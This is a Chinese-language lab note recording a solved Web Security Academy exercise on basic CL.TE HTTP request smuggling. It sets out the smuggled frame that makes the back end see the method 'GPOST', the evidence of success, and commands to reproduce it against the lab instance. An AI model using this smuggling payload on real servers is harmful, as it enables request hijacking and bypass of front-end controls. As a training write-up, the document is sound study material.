---
title: "lab-basic-cl-te"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-basic-cl-te

> evidences: [[request-smuggling-family]]

- 题面:HTTP request smuggling, basic CL.TE vulnerability(/web-security/request-smuggling/lab-basic-cl-te)
- 实例:https://0aff009d04da96cc8034fe5f006a00fe.web-security-academy.net
- 判定目标:走私使后端把下一请求认成方法 `GPOST`;状态:**solved**

## 关键步

1. 前端用 `Content-Length`、后端用 `Transfer-Encoding: chunked`。
2. 帧:`POST / ... Content-Length: 6 ... Transfer-Encoding: chunked ... \r\n\r\n0\r\n\r\nG`
   (CL=5+len(prefix)=6)。后端在 `0\r\n\r\n` 结束首请求,`G` 留在后端连接。
3. 前端的 pipelining 第二个请求常不发第二个响应(每请求回 `Connection: close`),但
   `G` 保留在后端连接上;另起一次 `POST /` → 后端见 `G`+`POST`=`GPOST` → 403。
4. `conn_reuse --cl-te 'G'` 后,单独发 `POST /`;响应 `403 "Unrecognized method GPOST"`。

## 证据摘录

```
conn_reuse <inst> --cl-te 'G' --quiet
conn_reuse <inst> --send-str 'POST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde'
 -> HTTP/1.1 403 Forbidden   body: "Unrecognized method GPOST"
solved_check -> {"solved":true}
```

## 复现命令

```
lab_launch launch EBC97ABBE886E96FACC0AAEE856F55E2A45D4784F5D9025FFA5E994B7D8BC2BB --widget-source /web-security/request-smuggling --jar <jar>
conn_reuse "https://<inst>" --cl-te 'G' --read-ms 2500 --quiet
conn_reuse "https://<inst>" --send-str 'POST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde' --read-ms 2500
solved_check "https://<inst>/" --jar <jar>
```

## 回马复核

- 新实例 `0acc00a303914e9b80f6dad700220058`(lab_id 与本档一致,路径无误配)。
- `conn_reuse "<inst>/" --cl-te 'G' --read-ms 2500 --quiet` → 200(首请求回包,
  `received_bytes` 正常)→ `conn_reuse "<inst>/" --send-str 'POST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde'`
  → **403 `"Unrecognized method GPOST"`**;`solved_check` → `{"solved":true,…}`。

